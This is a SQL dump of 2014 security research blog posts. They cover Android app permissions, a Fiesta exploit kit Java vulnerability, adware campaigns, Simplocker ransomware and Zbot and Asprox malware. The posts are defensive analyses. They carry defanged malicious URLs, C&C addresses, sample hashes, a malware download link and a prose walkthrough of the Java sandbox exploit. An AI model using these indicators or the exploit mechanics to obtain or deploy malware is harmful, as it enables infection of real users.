requested by the apps at the time of installation. As with Apple, there were many interesting and revealing findings, but in this effort, two of the most compelling findings were:\r\n\r\n\r\n	68% of apps that request SMS permissions ask for the ability to send SMS messages. With most Android malware currently targeting premium SMS fraud, this is concerning, especially as users tend to indicriminately accept requested permissions without scrutinizing whether or not they’re truly needed.\r\n	28% of apps with SMS permissions also request read SMS access. This is somewhat unsettling as an increasing number of apps/services send codes via SMS for mobile banking or two factor authentication.\r\n\r\nAs with the iOS analysis, I’d also like to take a moment to discuss the approach. While jailbreaking is necessary on an iOS device in order to do any kind of static analysis, this is not the case for Android apps.  It is the primary reason our analysis numbers are much higher for Android as no manual intervention is involved.\r\n \r\n\r\nNow on to the analysis. Android is based on a permission system, and each permission represents a given task. Applications can request required permissions and also define new permissions. For example, an application may declare that it requires access to the Internet. As discussed, Android permissions cannot be denied or granted after installation. An Android application declares the required permissions in its AndroidManifest.xml configuration file.\r\n \r\n\r\nFor this analysis, we focused on some of the more dangerous permissions, which allow apps to access a user’s personal information and grant access to functionality such as SMS, the address book etc. \r\n \r\n\r\nBelow is the list of the permissions which we consider to be higher risk permissions:\r\n\r\n\r\n\r\n	SMS related permissions\r\n	GPS related permissions\r\n	Phone call related permissions\r\n	Personal information related permissions\r\n	Address book related permissions\r\n	Device information related permissions\r\n\r\n\r\n\r\nOverall permission analysis:\r\n\r\nThe following graph illustrates the prevalence of dangerous permissions for all Android apps analyzed to date.\r\n\r\n\r\n\r\n\r\nFrom the graph, you can see that of the 75K+ Android apps analyzed, 36% of the apps request location permissions. 46% of apps are asking for the phone\'s state permission, which allows apps to access your SIM card information, IMEI number etc. 7% of apps are requesting SMS permissions, 10% request access to a user’s address book and 4% request access to the calendar.\r\n\r\n \r\n\r\nSMS Permissions breakdown:\r\n\r\nSMS permissions can be further broken down into the following categories:\r\n\r\n \r\n\r\n\r\n	READ_SMS permission: This permission allows the application to read all messages\r\n	WRITE_SMS permission: This permission allows the application to write SMS messages \r\n	RECEIVE_SMS permission: This permission allows the application to monitor incoming SMS messages to record or process them\r\n	SEND_SMS permission: This permission allows the application to send SMS messages\r\n\r\n \r\n\r\n\r\n\r\nHere we can see that, from all applications that have access to SMS, most ask for SEND_SMS permissions, which allow apps to send SMS messages from your phone. As the mobile malware market grows, most of the Android malware leverages SMS fraud. We have seen plenty of malware in the past, which abuses SMS by sending messages to premium phone numbers. Also, you can see that a quarter of applications are asking for READ_SMS permissions, which are more dangerous than WRITE_SMS permission as this can expose privacy concernssuch as intercepting two factor authentication schemes leveraging out of band SMS messages.\r\n \r\n\r\nAddress book permission breakdown:\r\n\r\nConsidered permissions:\r\n\r\n \r\n\r\n\r\n	WRITE_CONTACTS: This permission allows the application to write to the user’s contact data\r\n	READ_CONTACTS: This permission allows the application to read from the user’s contact date \r\n\r\n\r\n \r\n\r\n\r\n \r\n\r\nHere, you can see most of the apps are asking for READ_CONTACT permissions. It is always important to watch this permission as some apps, especially social networking apps, leverage your contact information in order to grow their install base. They want to check your address book to reach out to your friends and encourage them to install the same app.    \r\n\r\n \r\n\r\nInternet and network related permission analysis:\r\n\r\nPermission considered:\r\n\r\n \r\n\r\n\r\n	ACCESS_NETWORK_STATE: This permission allows the application to access information about the networks in use\r\n	INTERNET: This permission allows the app to open and close the network socket in order to connect to the Internet\r\n\r\n \r\n\r\n\r\n \r\n\r\n \r\nForm our data, we have seen that 90% of apps are requesting Internet access and 80% of apps are requesting network discovery permissions, which allow the app to determine the user’s cellular network connectivity, such as whether the user is using 3G or 2G etc.\r\n\r\n \r\n\r\nConclusion: \r\n\r\nFrom our analysis, outside of Internet permissions, a significant number of apps request access to the phone’s state permissions, which provide apps with the ability to harvest SIM card information and IMEI number information.\r\n\r\n \r\n\r\nWhy is this important? Apps, and especially the advertising libraries they utilize, want to be able to track user behavior across apps. By having access to unique identifiers, such as the IMEI, the same user (or at least the same device) can be identified when accessing various content or apps. This allows advertisers to better customize the advertisements that are delivered. Some people are fine with this, but others consider it a breach of privacy. The second most common permissions sought by Android apps involve GPS and user location. GPS data can also be used by advertisers to better target ads, apps are also increasingly becoming location aware, with apps such as Uber leveraging geolocation information to deliver a given service.\r\n\r\n \r\n\r\nSMS permissions provide apps with the ability to communicate, but can also be abused for monetary gain as we have seen with many premium SMS scams. Address book permissions tend to be leveraged to allow apps to grow their install base by encouraging users to promote their apps to friends. While Google does a reasonable job of weeding out malicious apps from the Google Play store, they aren’t perfect, so users should be selective when granting app permissions. This is especially true outside of official app stores such as Google Play, where app scrutiny may be limited - if it exists at all.\r\n\r\n \r\n\r\nRecommendations:\r\n\r\nUsers should be aware of the permissions they grant and the impact they could have on their device and their privacy. This knowledge will allow users to make better decisions when installing applications. For example, why would a wallpaper app require device SMS permissions? This should raise a big red flag.\r\n\r\n \r\n\r\nAlways install apps from trusted sources such as the Google Play or Amazon app stores. The vast majority of malicious apps come from third party app stores and if you want to limit exposure to malicious apps, it’s best to avoid third party Android app stores altogether.\r\n\r\n \r\n\r\nDo not use jailbroken/rooted phones as they override some of the built in security controls that the o/s provides and make it easier for malicious apps to steal data or provide access to SMS messages, the camera, etc.\r\n\r\n \r\n\r\nEstablish a screen lock. Use PINs and enable remote wipe on the device to protect the data in case if it get stolen\r\n\r\n \r\n\r\nExample:\r\n\r\nApplication:\r\n\r\n随身眼 手机监控 视频监控 安防 监控 视频 交通 (Portable Eye mobile surveillance video surveillance security monitoring video traffic)\r\n\r\nPermissions asked by application:\r\n\r\n\r\n	android.permission.CHANGE_NETWORK_STATE\r\n	android.permission.ACCESS_MOCK_LOCATION\r\n	android.permission.READ_LOGS\r\n	android.permission.ACCESS_COARSE_LOCATION\r\n	android.permission.INTERNET\r\n	android.permission.ACCESS_FINE_LOCATION\r\n	android.permission.SEND_SMS\r\n	android.launcher.permission.INSTALL_SHORTCUT\r\n	android.permission.WRITE_SMS\r\n	android.permission.ACCESS_NETWORK_STATE\r\n	android.permission.GET_TASKS\r\n	android.permission.WRITE_EXTERNAL_STORAGE\r\n	android.permission.RECEIVE_BOOT_COMPLETED   \r\n	android.permission.CALL_PHONE\r\n	android.permission.READ_PHONE_STATE\r\n	android.permission.READ_SMS\r\n	android.permission.VIBRATE\r\n	android.permission.ACCESS_LOCATION_EXTRA_COMMAN\r\n	android.permission.ACCESS_WIFI_STATE\r\n	android.permission.CHANGE_WIFI_STATE\r\n	android.permission.RECEIVE_SMS\r\n	android.permission.READ_CONTACTS\r\n\r\n \r\n\r\nThe following permissions represent those with a higher risk to the end\r\n\r\nuser: \r\n\r\n\r\n	android.permission.ACCESS_COARSE_LOCATION            \r\n	android.permission.ACCESS_FINE_LOCATION   \r\n	android.permission.ACCESS_MOCK_LOCATION\r\n	android.permission.CALL_PHONE           \r\n	android.permission.MODIFY_PHONE_STATE     \r\n	android.permission.PROCESS_OUTGOING_CALLS           \r\n	android.permission.READ_CALENDAR   \r\n	android.permission.READ_CONTACTS   \r\n	android.permission.READ_OWNER_DATA           \r\n	android.permission.READ_PHONE_STATE           \r\n	android.permission.READ_SMS\r\n	android.permission.RECEIVE_MMS        \r\n	android.permission.RECEIVE_SMS          \r\n	android.permission.SEND_SMS\r\n	android.permission.SET_ALWAYS_FINISH           \r\n	android.permission.SET_ANIMATION_SCALE    \r\n	android.permission.SET_DEBUG_APP   \r\n	android.permission.SET_PROCESS_LIMIT            \r\n	android.permission.SET_TIME_ZONE    \r\n	android.permission.SIGNAL_PERSISTENT_PROCESSES\r\n	android.permission.SUBSCRIBED_FEEDS_WRITE              \r\n	android.permission.SYSTEM_ALERT_WINDOW \r\n	android.permission.USE_CREDENTIALS\r\n	android.permission.WAKE_LOCK             \r\n	android.permission.WRITE_APN_SETTINGS       \r\n	android.permission.WRITE_CALENDAR \r\n	android.permission.WRITE_CONTACTS \r\n	android.permission.WRITE_EXTERNAL_STORAGE\r\n	android.permission.WRITE_SMS\r\n\r\n \r\n\r\nReferences:\r\n\r\nhttp://developer.android.com/reference/android/Manifest.permission.html', 'Mobile', 'https://www.zscaler.com/blogs/research/and-mice-will-play-app-stores-and-illusion-control-part-ii');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (185, 'Exploring The Java Vulnerability (CVE-2013-2465) Used In The Fiesta EK', 'Sameer Patil', 'July 03, 2014', 'While going through our daily analysis this month, we came across several Fiesta Exploit Kit attacks. Although this EK first emerged in August 2013, the authors have constantly updated their exploitation code to evade detection. It mostly targets known vulnerabilities in Java and Microsoft Silverlight for exploitation. We identified a .jar file attached to a FiestaEK landing page and on performing some manual code analysis, found it to be exploiting the CVE-2013-2465Java vulnerability.    There isn’t much detail available regarding how the exploit actually occurs, so we really wanted to walk through each step of the attack and explain each step in detail. The code as you will see is constructed in a way to avoid static detection using string searches or Yara scans.         Jar file details:    MD5 hash: ed2e61b302c6ed7ccb3699cc33d23f71    VirusTotal report: 16/54         The malicious jar file can also be downloaded from here (hxxp://www.malware-traffic-analysis.net/2014/06/07/2014-06-07-Fiesta-EK-malware.zip). It contains the following six classes.                                          The malware author tries to complicate the program by constructing strings using String.replace(). For eg:                                       Here, lies() replaces the substring “un6u4vy46” with “e” in all places present in the 1st parameter to form “createWritableRaster”. Even the random class and method names and the scattered code makes analyzing the code a challenge.         The execution of the .jar file is triggered from a compromised website. The execution starts through the entry point “sash0k.start()” method with a long string parameter which it gets from the host site itself. URL domains are extracted from this string and stored in an array. Malware will connect to these domains and download actual malware executables after the machine has been successfully compromised. Let’s look at each step in detail.    Initially, the code creates two BufferedImage objects in two different ways. Let’s have a look on both.         First object: “localBufferedImage1”    Reflection(Java.lang.reflect) is used to invoke the setPixel() method present in the java.awt.image.CreateWritableRaster class using an object of BufferedImage subclass of the java.awt.image package. An integer type object is then passed to set the Raster values. The returned object is typecast to BufferedImage type and is stored as localBufferedImage1.                      Second object: “localBufferedImage2”    The second object is created by passing an object of the ComponentColorModel class to its parameterized constructor.                 An important thing to note is that this ComponentColorModel object is created by passing an object of ICC_ Colorspace constructed from an ICC_Profile instance.                     The SampleModel used in this case is the MultiPixelPackedSampleModel which has an interesting feature of writing the DataBuffer in the image. To be clear, these two objects are different from each other. Many image related classes are used in this code, but the only goal is to capture the flag!    The actual exploitation occurs when the AffineTransformOp.filter() method is called with the two BufferedImage objects as parameters. It is supposed to perform a linear mapping from 2D coordinates in the source Raster to 2D coordinates in the destination Raster.                               But before initiating the transformation, the ColorSpace compatibility is checked through the isCompatibleRaster() method of class “java.awt.image.ColorModel”. This method becomes vulnerable because code bypasses this compatibility check to always return “True” by overriding it in a base class, which is Class “tiel3k” in our case. The destination raster memory array is then overflown resulting in heap corruption.                          This vulnerability is thus named as the “Incorrect image channel verification” vulnerability.    Because the .jar runs as applet in user’s browser, the code must use SecurityManager and get required permissions to perform privileged actions like creating and executing files in memory in our case.  As we can guess, the destination of the overflow is in the heap region of localBufferedImage2 and the above access permissions are given only to this object. Fields of volatile data types are created to allocate memory and write data in it. If we go more deeper in the code, we see that 8192 bytes (8Kb) memory was reserved for localBufferedImage2 object (assuming a 4 byte Integer).             Now since the code has bypassed the Java sandbox protections of a browser, it’s ready to perform some privileged actions like file download and execution on the user machine. The code ultimately connects to various URL domains, downloads .exe files, stores them in the <temp> folder and executes them.                     Since there has been no Java vulnerabilities reported as of yet in 2014, malware authors are using old exploits and rewriting the code with additional obfuscations. Zscaler provides JavaTestwhich is a free tool for checking the current java version. The best way to stay safe is to regularly update to the current version of Java or to remove it altogether if it isn’t necessary to the machine in question.', 'Vulnerability', 'https://www.zscaler.com/blogs/research/exploring-java-vulnerability-cve-2013-2465-used-fiesta-ek');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (186, 'Adware Utilizes Google Docs To Scam Users', 'Chris Mannon', 'June 24, 2014', 'Spammers are no stranger to exploiting existing file-sharing services to propagate their warez and Google has been used in the past to bring some sense of legitimacy to a scam.  In a scam that we recently uncovered, user\'s will receive a URL shortened link, which will lead them to a malicious ad, hosted within Google Docs. There is no malware explicitly hosted on Google docs, but rather a link to a scam which is too tempting not to click...         	  		  			  		  		  			A must-click to be sure.  		  	           This particular scam is capitalizing on PC video gamer\'s desire to download free software. The download link will take the user to freeware site that will supposedly give them the most innovative Goat game to date.       	  		  			  		  		  			gripped(.)biz redirects the user to many different Adware packages  		  	             User\'s will leave the site disappointed however, when they realize that the only thing available is a series of fake codecs, media players, and Browser Helper Objects.       	  		  			  		  		  			User\'s come for the Goat Simulator, but stay for the bogus media player.  		  	        In this specific attack, user\'s are subjected to just about every modern adware scam to date.  I attempted the download a few times and uncovered separate packages which scored very low on VirusTotal.    ShopAtHome Toolbar - b181e5f9cfa97c43841fe2e385c974fa  MediaPlayerClassic - 408e8969cd0abd153eab6696f8add363    Sadly, neither download provides access to Goat Simulator 2014, but instead just continues to take advantage of the user\'s good faith by offering them free gift cards if they enter their e-mail address and Personal Identifiable Information.       	  		  			  		  		  			Any e-mail address will be spammed.  		  	        The conclusion that users and administrator\'s should come to is that there is no safe haven from malicious or suspicious content on the Internet.  All content should come under the scrutiny of a security solution, including Google Document Sharing. Nothing in this life is free, let alone the most innovative Goat Simulator ever conceived by man.', 'Advertising', 'https://www.zscaler.com/blogs/research/adware-utilizes-google-docs-scam-users');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (187, 'Beware Of Skype Adware', 'Rubin Azad', 'June 24, 2014', 'During our daily log analysis, we recently encountered a sample purporting to power up Skype with different emoticons. The binary, when installed, integrated itself with Skype and sent the following message contacts without further intervention.             The binary in question (SkypEmoticons.exe) can be downloaded from hxxp://skypemoticons.com/.           	  		  			  		  		  			Home page of hxxp://skypemoticons.com/   		  	           After installation it dropped following executable files:                Most of the dropped files are Adware which may lead to some malicious activities.    Here is the VT report for SkypeEmotions.exe.                  VT reports of the various dropped samples:             	  		  			MD5  			VT Hits  		  		  			aa9af86b02f4e497eb0284872b50af41  			21/54  		  		  			e96f6d6257bdcb54c297569d42219e97  			22/54  		  		  			1d283dd3ae2312eee624e8b8c46f6adb  			45/51  		  		  			666ab79b63833a2a2502c119f0843b4a  			22/54  		  		  			364207a743ff39207667a0c89ff38768  			20/53  		  		  			02861acc8be1b59be2db226947a384b2  			5/54  		  		  			23912df27a61ea0463c5509ba6a97579  			38/52  		  		  			cee68ad38668785cd39e37ca069f8b85  			19/54  		  		  			b4eb856acc30b0005a44b87566850fb3  			3/54  		  		  			2830932fca42074f17c46c56b4942ac2  			23/54  		  	               Contacted sites from which dropped files were downloaded:            	hxxp://homebestmy.info  	hxxp://superstoragemy.com  	hxxp://setepicnew.info  	hxxp://198.7.61.118  	hxxp://54.187.76.32  	hxxp://54.213.103.160        We also observed User-Agent: TixDll being used for downloading the files, which provided a handy mechanism to do some data mining and identify other domains associated with the adware. The following malicious domains were observed to be contacted via this User-Agent:    hxxp://getapplicationmy.info           hxxp://applicationgrabb.com               hxxp://appmegga.info                                hxxp://downlloaddatamy.info                Other domains identified in our logs contacted by this User-Agent are not currently showing any malicious activity, but may deliver some malicious content in the future:         hxxp://appussajob.info  hxxp://dirgreatbestepicl.info  hxxp://embededstub.de.drive-files-b.com  hxxp://embededstub.download.dmccint.com  hxxp://fra-7m17-stor06.uploaded.net  hxxp://getdirfrfee.info  hxxp://getgoolld.info  hxxp://getinstaal.info  hxxp://getmeegan.info  hxxp://homebestmy.info  hxxp://setepicnew.info  hxxp://softservers.net  hxxp://superstoragemy.com  hxxp://xml.dljs.org     Use caution when installing any add-on program, especially one that is able to control a powerful communication tool such as Skype.', 'Advertising', 'https://www.zscaler.com/blogs/research/beware-skype-adware');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (188, 'FIFA World Cup Fake Streaming', 'Sameer Patil', 'June 17, 2014', 'We all love football and when the world cup is around, we take a break from office, switch on the TV and enjoy the game! According to the estimates, billions of people will watch the matches live. A good proportion of people watch it online as well. Not surprisingly, the Brazil World cup matches are being used as an opportunity by attackers to post spam links, adware and Trojans in various sports related websites. The chances of visiting these websites is of course much given World Cup fever. One of the more popular websites to watch live streamed sports matches is lshunter.com.    I recently tried to watch the Brazil vs Croatia match on lshunter.com. It asked me to click on ‘Start’ button to begin the live stream.               When we start the video stream, it redirects to hxxp://www.sofler.com/lp/videoperformer/v18/?v=18&cid=4151&clickid=0066965515096773257&a=8, asking for the installation of the ‘Latest Video Converter’. The page looks similar to Adobe’s Flash update website and tricks the user into downloading an updater executable. In our excitement to watch the match, we may sometimes just follow the links and install the update/software before even verifying the source.                    Our internal analysis confirmed that the installer is a Potentially Unwanted Program(PUP) that contains adware, installs toolbars or has other unclear objectives. It can be downloaded directly from: hxxp://www.appoder.com/download3/$m%2BI%2FeZA3ZUMplwkZ?v=18&cid=4151&clickid=0066965515096773257&a=8&cert=r2&installer=tt&resources=tt&maker=pth.  Such programs are made mainly for advertising purposes and for inflating a site\'s page rank in Google search results. At the same time it troubles the user by changing some browser settings like default home page and default search engine.         File : VideoPerformerSetup.exe    MD5: 99bbdce5fa1fe4692164a7c5425e552f  VirusTotal Report: 11/54      Another such example we found was located at hxxp://antenasport.net    When clicking on the link, we are taken to a fake torrent software download page.    Here, if we try to install the video downloader, it again redirects to a downloader page with a very long URL: hxxp://cdn.download-videos-free.com/lp/?appid=277&subid=20rUiz2FyHs6jI4D3kXVAW1wVn4T000.&line_item=561741&info=pofmEapp80E6INYWRNmO4mqpVFObUblO_p545PzWE3wDvFkwmYxuAws6V3b9JwlAAMpdDEBVqI1MAGjnAhR42oEkD1ayVdvtbk58EoMVzP-drJwzQc45A5_E45moeuFdo_4OJSqWOWCfsTNEqmfOuXT8HnMKJ4i1KttwhluLoWozLv6d9-xZfxFFbEn7jNV61ThZLh_GXzyLdW9Cr-QM-PNrQqvedi_bDlFQzq2ZbiqXn8rg7AK6IgEi6_bI6_5kez-PierrqxpxeerYycsgkJBUFScZ3dORrBTQI34wLsA3IvvGLNs8m9hbfW0X87dwcCVMqHGUuUeTwdE8Vrg1AQqFzD9QOcHGxAi9Zhp9JYYkXIJwYVmX7Q0lw5y7Mk3oacvtN8SHuCfoMYc23rZWR6jTKUBhynZ9qm4v4gv9bZdd-P22981310_CR17481133_CA18661040&dp=pofmEapp80E6INYWRNmO4mqpVFObUblO_p545PzWE3wDvFkwmYxuAws6V3b9JwlAAMpdDEBVqI1MAGjnAhR42oEkD1ayVdvtbk58EoMVzP-drJwzQc45A5_E45moeuFdo_4OJSqWOWCfsTNEqmfOuXT8HnMKJ4i1KttwhluLoWozLv6d9-xZfxFFbEn7jNV61ThZLh_GXzyLdW9Cr-QM-PNrQqvedi_bDlFQzq2ZbiqXn8rg7AK6IgEi6_bI6_5kez-PierrqxpxeerYycsgkJBUFScZ3dORrBTQI34wLsA3IvvGLNs8m9hbfW0X87dwcCVMqHGUuUeTwdE8Vrg1AQqFzD9QOcHGxAi9Zhp9JYYkXIJwYVmX7Q0lw5y7Mk3oacvtN8SHuCfoMYc23rZWR6jTKUBhynZ9qm4v4gv9bZdd&dp2=P22981310_CR17481133_CA18661040&c8=service.srvmd6.com    Our dynamic and behavioral analysis runs confirmed it to be adware. It also drops few DLLs, tmp and gif files in system folder to support its activities.  File: setup.exe    MD5: 77a2f54fee9438a7dd4c20199a85737c    VirusTotal Report:8/54    Users also need to be aware of various random Facebook posts and comments mentioning live streaming sites like hxxp://soccertv.blogdns.com/. We have also encountered such links when shared by friends on social networks.             The aforementioned link takes us to a video player updater site: hxxp://www.sweetplayer.com, which also hosts some adware scripts in it.        File: SweetPlayer_TSA24NBA7.exe    MD5: b035162687f54779a7c5739f08b9b79b    VirusTotal Report: 8/54      End users should be very wary of any site pushing executables. Browser plugin updates should only be proactively downloaded directly from the associated vendor. Don’t ever blindly trust a site suggesting a browser update.  Enjoy the World Cup!', 'Social Engineering', 'https://www.zscaler.com/blogs/research/fifa-world-cup-fake-streaming');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (189, 'Android App Shares World Cup News At The Expense Of Your Privacy', 'Viral Gandhi', 'June 14, 2014', 'Everyone is excited about the football World Cup and apparently so are those peddling adware. Earlier we discussed some of the more aggressive Android advertising SDKs integrated apps flagged by AV vendors as Adware - Google Play vs AV vendors. We recently came across a particularly aggregious adware app promoting World Cup news.    App: Brazil 2014 World Cup    Virus Total: 18/45    List of suspicious methods identified via static analysis:           	getMACAddress  	getLine1Number  	 getsms  	 getLongitude  	 getLatitude  	 getImei  	 getImsi  	 getAndroidId  	 getEmail  	 getManufacturer  	 getOsVersion  	 getNetworkconnectiontime         Let see how it harvests all information.           	  		  			  		  		  			Device information  		  	           This app contains the Airpush and Revmob advertising SDKs. From the screenshot above, you can see the application harvesting  the device MAC address (something Apple has cracked down on), mobile ID, Android ID and serial numbers. Adware harvests such information for tracking users as this information allows for tracking the user’s device across applications using the same SDKs.           	  		  			  		  		  			Device information  		  	           Above, you can see the application harvesting device model information, the SDK API version, manufacturer details and the device OS version. This information can then be used by advertisers to build statistics about app usage.      	  		  			  		  		  			Phone number  		  	      In this screenshot, you can see the application also collecting the user\'s phone number. This is very sensitive information as such information can be used for phone based spamming and advertising campaigns.      	  		  			  		  		  			Email  		  	         This app also collects the user\'s email account, again, this too is likely used for spamming and advertising campaigns.      	  		  			  		  		  			IMEI  		  	      Finally, the application collects the device IMEI number, another valuable identifier for tracking the same device across applications sharing the same advertising SDKs.           	  		  			  		  		  			Data sent  		  	         You can also see all of the info being delivered to a third party.      	  		  			  		  		  			Google play store developer policy  		  	      As per the Google Developer policy, usage of MAC address and IMEI numbers is strictly prohibited. Still, apps are regularly permitted into the Google Play store and bypass Google\'s automated checks. This is an area where Apple is doing a better job of protecting end user privacy through both changes at the O/S level and via application reviews conducted prior to apps being included in the App Store. Apple would no longer permit an app with the level of data collection seen in this particular Android app. There is always confusion about content related to user privacy used by Android apps. In spite of clear guidelines from Google about data collection, developers are ignoring the rules and Google is not aggressively enforcing them.    Despite the aggressive data collection, this app is not malicious. Instead we (and many anti-virus vendors) consider this app an example of aggressive adware.    Stay safe while enjoying the World Cup.  -Viral.', 'Mobile', 'https://www.zscaler.com/blogs/research/android-app-shares-world-cup-news-expense-your-privacy');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (190, 'Analyzing Android ‘Simplocker’ Ransomware.', 'Viral Gandhi', 'June 06, 2014', 'Recently we came across the sample of a new ransonware ‘Simplocker’ for Android. The ransomware encrypts the files present on SD card and later it demands ransom from victim to decrypt the files.           File Information:    File: fd694cf5ca1dd4967ad6e8c67241114c.apk    Size: 4917678    md5: fd694cf5ca1dd4967ad6e8c67241114c    Virustotal Report: 9/51      Let\'s analyze the ransomeware.    The ransomware  shows the ransom message in \"Russian\" language asking for ransom money.      	  		  			  		  		  			Ransom message.   		  	      The ransom message asks for \"260 Ukrainian Hryvnia\" along with the threat message of deleting the data if ransom not paid.      Translation of the message:      	  		  			  		  		  			Translation of ransom message.  		  	      Let’s dive in to the code for more details.      	  		  			  		  		  			Use of AES.   		  	        	  		  			  		  		  			Static strings  		  	      The above screenshot shows how ransomware is using AES encryption for encrypting files. Simplocker will scan for the filetypes jpeg, jpg, png, bmp, gif, pdf, doc, docx, txt, avi, mkv, 3gp, mp4 files from the SD card. Then it encrypts them with cypher key “jndlasf074hr”.      	  		  			  		  		  			Suffix \"enc\"  		  	      The ransomware adds suffix “enc” for scanned files after encrypting them.           	  		  			  		  		  			Device Informations: IMEI number.  		  	        	  		  			  		  		  			Device Informations: Model and Manufacture id.   		  	      It also harvests device informations like device IMEI number, modal number etc.      	  		  			  		  		  			C&C.  		  	      After harvesting device’s details, it communicates with the CnC server, highlighted in screen shot. Interestingly ransomware uses ‘tor’ as a proxy to connect to CnC server for silent communication.      CnC Server:  hxxp://xeyocsu7fu2vjhxs.onion/      The proxy details are shown below.      	  		  			  		  		  			Proxy Details.  		  	      It also keeps on monitoring the back key press on phone. This is done to keep displaying the ransom message again and again.      	  		  			  		  		  			Monitoring back press.  		  	      We advice not to download or install apps from unauthorized app stores to stay away from such android malwares.           References:    http://www.welivesecurity.com/2014/06/04/simplocker/    http://contagiominidump.blogspot.in/2014/06/simplocker-android-file-encrypting-tor.html', 'Mobile Malware', 'https://www.zscaler.com/blogs/research/analyzing-android-simplocker-ransomware');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (191, 'USPS Spam Delivering Asprox Variant', 'Chris Mannon', 'May 29, 2014', 'UPDATE: The botnet which is described here is called \'Asprox\'. I\'ve compared research with that seen from StopMalvertising.    Recent email spam has begun taking advantage of user\'s need to snail mail something.  The attacker will forward a message supposedly from USPS in order to get victim\'s to click on a link purported to be a shipping receipt, which actually leads to a malicious file.  If the user is unfortunate enough to click the link in the spam mail, a zip file containing a variant of Asprox is downloaded.       	  		  			  		  		  			At the time of research, the VT score was 4/53  			   		  	    Once the file makes it way onto the desktop, it feigns a document icon in order to trick the user into thinking it is safe to view.  This is actually the malicious executable which scored 4/53 on initial VirusTotal scans.       	  		  			  		  		  			Never trust an icon!  Check the \'Right Click > Properties\' to see the true extension  		  	    The file itself creates local copies of itself in the logged-in User\'s Local Application Data and creates an autostarter to ensure that the victim stays infected after restarting their compromised PC.       	  		  			  		  		  			The threat installs a randomly generated Autostarter value  		  	    ThreatLabZ has monitored this infection for a few days and observed several other download locations that kick off this threat.       	  		  			  		  		  			All links download a similar package.  A third party sandbox analysis is available here  		  	    The common factor across all of these dropped files is that they all POST bzip2 compressed data which is then encrypted with a 16-byte random RC4 key via HTTP as reported by StopMalvertising.  We\'re seeing a growing number of attacks which utilize this method of phone home activity. The case of this Asprox threat phones home over ports 443 and 8080.       	  		  			  		  		  			Communication is sent over port 8080 or 443  		  	    ThreatLabZ collected numerous IPs which were seen to communicate with malicious variants mentioned above.       	  		  			  		  		  			IPs which communicated with Malicious samples.  		  	    Users and Administrators should be cautious of all traffic regardless of the ports it communicates on.  Attackers are leveraging nonstandard HTTP ports in order to bypass some security solutions.', 'APT;Evasion/Stealth;Malware;Phishing', 'https://www.zscaler.com/blogs/research/usps-spam-delivering-asprox-variant');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (192, 'Spearphishing Connects PCs To Russian Botnet', 'Chris Mannon', 'May 16, 2014', 'The talent over at MalwareBytes wrote this week about a Zbot dropper which comes from a PDF exploit through a spear-phishing e-mail.  In their blog, they discuss how a spear-phishing attempts to exploit either CVE-2013-0640 or CVE-2013-2729. User\'s must be extra cautious dealing with any attachment in an e-mail, but this threat merits extreme concern.  It installs a very persistent rootkit and logs the victim into a botnet which receives new commands/tasks every 10 minutes.  Removal is near impossible and also will use your Windows Mail to spear-phish your contact list.    As noted by MalwareBytes, attackers often use false extensions in order to infect victims (such as totally_legit.doc.exe). In the case of this attack, victim\'s download and click a malicious PDF.  This PDF, as Malwarebytes mentions, exploits Adobe Reader 11 and downloads an executable file.  At the time of research, 18/51 AV companies saw through this ruse and blocked the content before it had a chance to further exploit the victim.    We obtained a copy of the same malware in the Zscaler cloud and noted the following observations. A dropped file immediately connects to a Russian IP address to set up its beaconing activity as well as download more malicious PE files to the victim\'s machine.         	  		  			  		  		  			axisbuild[.]com is showing some suspicious activity besides beaconing.  		  	      The translation of the C&C configuration file seen above in English is:       Интервал обращения к серверу в минутах    (\'Interval back to the server in minutes\')    Таймаут цикличного обращения по ссылкам в минутах    (\'Timeout cyclical treatment referred to in minutes\')    Список ссылок c&c    (\'The list of references c & c\')    Страна бота    (\'Country bot\')    Список задач    (\'task List\')      In addition to awaiting for further commands from a remote server, the threat will also make many edits to the vicitm\'s system in order to remain despite removal processes.    There are several locations where this threat might download additional malicious PE files.  I\'ve added a brief list below to illustrate.  I will provide more upon request to interested security professionals.                     	  		  			  		  		  			There are other locations used to download malicious files.  		  	      We took all different versions of these files and combined the phone home traffic to give a full list of IPs contacted.  The dropped files immediately begin to contact various IP addresses using nonstandard ports.  The following is a list of IPs and their hosted country.                                 	  		  			  		  		  			List of nonstandard ports used by all variants.  		  	                       	  		  			  		  		  			List of IP addresses which were contacted across all variants.  		  	                  Administrators should monitor their networks for any activity which might match the outgoing transactions above.  Administrators will have a really tough time removing the threat due to the creation of a rootkit and altering the system\'s boot sequence.  The Zbot variant maintains a high level of persistence by doing the following:                	  		  			  		  		  			This allows for untested drivers to be executed as part of the boot process  		  	                  	Uses bcdedit to modify the Windows boot settings.             	  		  			  		  		  			Dropped files create a system driver which executes during boot sequence.  		  	             	Spawns drivers in the Windows Directory             	  		  			  		  		  			The Autostarter value is randomly generated  		  	             	Creates an autostart registry key             	  		  			  		  		  			Used to inject malicious process into kernel.  		  	             	Registers kernel notifiers (kernel callbacks)             	  		  			  		  		  			The victim is used as a node in further spear-phishing campaigns.  		  	             	Manipulates Windows Mail files                  Users and Administrators must take extra caution against suspicious attachments.  Common methods for APT infection include tricking users to go to a compromised website or downloading something malicious through an attachment.  The fact that this threat compromises Windows Mail files means that the victim can be used to attack your contact list.  This allows for the attack to circumvent spam lists and base protections employed by regular users.  The best solution is to employ a sandboxing solution against all files which come through e-mail.', 'APT;Exploit;Malware;Vulnerability', 'https://www.zscaler.com/blogs/research/spearphishing-connects-pcs-russian-botnet');
